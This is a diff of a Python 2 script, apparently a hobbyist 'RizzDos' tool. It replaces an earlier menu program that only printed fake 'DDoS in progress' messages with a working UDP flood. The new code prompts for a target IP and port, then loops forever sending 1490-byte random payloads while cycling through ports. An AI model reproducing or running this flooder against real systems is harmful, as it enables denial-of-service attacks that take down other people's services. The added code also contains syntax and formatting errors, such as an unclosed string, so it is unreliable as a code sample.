@@ -19,141 +19,45 @@ cyan= '\033[36m'
 bold= '\033[1m'
 end= '\033[0m'
 
-def flush(s):
-    for c in s + '\n':
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(random.random() * 0.01)
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-def out():
-        exit()
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-def back():
-        raw_input('\n\x1b[1;91m                                 [ \x1b[1;97mBack \x1b[1;91m]')
-        home()
+os.system("clear")
+os.system("toilet -f big RizzDos | lolcat")
+os.system("date | lolcat)
+print '---------------------------------------------------'
+print cyan+' Author  : '+green+'RizzSploit {ThreRata92} '
+print cyan+' Github  : '+green+'http://github.com/RizzSploit '
+print cyan+' Youtube : '+green+'RizzSploit '                   
+print putih+'---------------------------------------------------'
+print ''
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
-def nxt():
-        raw_input('\n\x1b[1;91m                                 [ \x1b[1;97mNext \x1b[1;91m]')
-        os.system('clear')
-
-def logo():
-        f = open('Baner/asci')
-        print merah+f.read()
-        f.close
-        print '---------------------------------------------------'
-        print cyan+' Author  : '+green+'MRH {ExploiID} '
-        print cyan+' Github  : '+green+'http://github.com/MRH02 '
-        print cyan+' Youtube : '+green+'MRH Official '                   
-        print putih+'---------------------------------------------------'
-        print ''
-
-def req():
-    os.system('clear')
-    logo()
-    home()
-
-def ddos():
-    os.system('clear')
-    logo()
-    print merah+"Contoh Alamat IP (192.168.xxx.xxx)"
-    name=raw_input(merah+"Masukkan IP Target : ")
-    os.system('clear')
-    print hijau+"[*] Sedang DDoS, Mohon Bersabar..."
-    time.sleep(2)
-    dos2()
-    
-def dos2():
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    print merah+"Sedang DDoS  "+name+" Sampai Down!"
-    dos2()
-
-def update():
-	os.system('clear')
-	os.system('git stash && git pull origin master')
-	os.system('python2 install.py')
-	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-	home()
-
-def menu():
-        os.system('clear')
-        time.sleep(1)
-        logo()
-        flush (merah+"FOLLOW IG : @jalanyanglurus_")
-        flush (merah+"1. Start DDoS"           merah+"2.Update")
-        flush (green+"3.Install Requirements"  merah+"4.Quit")
-def pilih():
-    zedd = raw_input(merah+'RizzDos$ > ')
-    if zedd == '':
-        print '\x1b[1;91m[!] Can\'t empty'
-        time.sleep(1)
-        os.system('clear')
-        home()
-    else:
-        if zedd == '1':
-            ddos()
-        else:
-            if zedd == '2':
-                update()
-            else:
-              if zedd == '3':
-                req()
-                home()
-              else:
-                                  if zedd == '4':
-                                        out()
-                                  else:
-                                    print "merah+pilih 1-4"
-                                    os.system('clear')
-                                    home()
-
-def home():
-	menu()
-	pilih()         
-
-home()
+os.system("clear")
+os.system("figlet Attack Starting")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print green+"Sent %s " +merah+ "Attacking Thats IP %s port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
